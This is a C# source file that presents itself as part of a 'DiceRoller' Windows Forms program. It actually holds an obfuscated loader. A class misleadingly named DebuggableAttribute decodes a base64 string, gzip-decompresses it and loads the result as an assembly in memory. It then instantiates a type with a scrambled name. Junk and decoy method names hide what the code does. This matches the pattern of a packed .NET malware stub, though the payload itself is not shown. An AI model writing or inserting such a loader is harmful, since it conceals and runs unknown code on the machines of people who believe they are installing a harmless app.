using System;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace DiceRoller;

internal class DebuggableAttribute
{
	private Type L;

	public DebuggableAttribute(RadioButton p1, string p2)
	{
		FillRecta(Convert.FromBase64String(p2));
		sss();
	}

	public object sss()
	{
		Associates(new ColorConverter());
		object result = default(object);
		return result;
	}

	public void FillRecta(object k)
	{
		Assembly assembly = Thread.GetDomain().Load(gtr((byte[])k));
		L = assembly.GetType("Gu0qgeoVL8IdPsM5UO.tW4BXXRF6qg0Ujabmh");
	}

	public object Associates(ColorConverter TaskCanceledException)
	{
		object[] array = null;
		array = new object[3]
		{
			CompatibilityMap.RestrictedError,
			null,
			null
		};
		array[1] = CompatibilityMap.ValueEnumerator;
		array[2] = "DiceRoller";
		Activator.CreateInstance(L, array);
		object result = default(object);
		return result;
	}

	public byte[] gtr(byte[] bytesToDecompress)
	{
		using GZipStream gZipStream = new GZipStream(new MemoryStream(bytesToDecompress), CompressionMode.Decompress);
		byte[] buffer = new byte[4096];
		using MemoryStream memoryStream = new MemoryStream();
		int num;
		do
		{
			num = gZipStream.Read(buffer, 0, 4096);
			if (num > 0)
			{
				memoryStream.Write(buffer, 0, num);
			}
		}
		while (num > 0);
		return memoryStream.ToArray();
	}
}
